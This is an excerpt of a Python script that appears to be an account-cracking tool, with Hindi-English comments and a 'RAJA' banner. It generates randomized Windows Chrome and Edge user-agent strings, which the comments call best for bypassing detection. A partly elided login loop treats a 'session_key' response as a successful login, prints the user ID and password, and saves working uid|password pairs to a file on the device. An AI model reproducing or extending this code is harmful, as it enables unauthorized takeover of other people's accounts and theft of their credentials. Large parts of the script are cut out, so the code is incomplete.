...
def windows():
    """
    Updated & Optimized Windows User-Agent Generator (2026)
    """
    # Random Chrome Major Versions (135 se 145 tak 2026 ka standard hai)
    chrome_v = str(random.choice(range(135, 146)))
    # Random Build Numbers
    build_v = f"{random.randint(6000, 7500)}.{random.randint(100, 255)}"
    
    # A: Modern Windows 11 - Chrome (Most Trusted)
    A = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v}.0.{build_v} Safari/537.36"
    
    # B: Windows 10 - Microsoft Edge (Bypass ke liye best hai)
    edge_v = f"{chrome_v}.0.{random.randint(2800, 3100)}.{random.randint(40, 95)}"
    B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v}.0.{build_v} Safari/537.36 Edg/{edge_v}"
    
    # C: Windows 10 - 32-bit (Legacy support ke liye)
    C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 134)}.0.{random.randint(5000, 6000)}.{random.randint(10, 150)} Safari/537.36"
    
    # D: Windows 11 - Brave or Specialized Browser feel
    D = f"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_v}.0.{build_v} Safari/537.36"
...
def window1():
    """
    Highly Optimized Windows User-Agent Generator (April 2026 Update)
    """
    # 2026 ke latest Chrome versions (140-155 range)
    major = str(random.choice(range(140, 156)))
    build = f"{random.randint(6500, 8000)}.{random.randint(10, 190)}"
    
    # A: Modern Windows 11 (High Trust Factor)
    A = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build} Safari/537.36"
    
    # B: Windows 10 with Edge Browser (Bypass ke liye best)
    edge_build = f"{major}.0.{random.randint(3000, 3500)}.{random.randint(50, 150)}"
    B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build} Safari/537.36 Edg/{edge_build}"
    
    # C: Windows 11 - 32-bit (Realistic Variety)
    C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(130, 139)}.0.{random.randint(5500, 6400)}.{random.randint(100, 200)} Safari/537.36"
    
    # D: Windows 10 - Laptop/Desktop mix (Fresh Headers)
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{random.randint(6000, 7000)}.0 Safari/537.36"
    
    return random.choice([A, B, C, D])


# Set window title
sys.stdout.write('\x1b]2;𓆩 𝐑.𝐀.𝐉.𝐀 👑 𓆪 \x07')
        ...
        try:
            with requests.Session() as session:
                ...
                if 'session_key' in str(po):
                    ...
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJAx1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
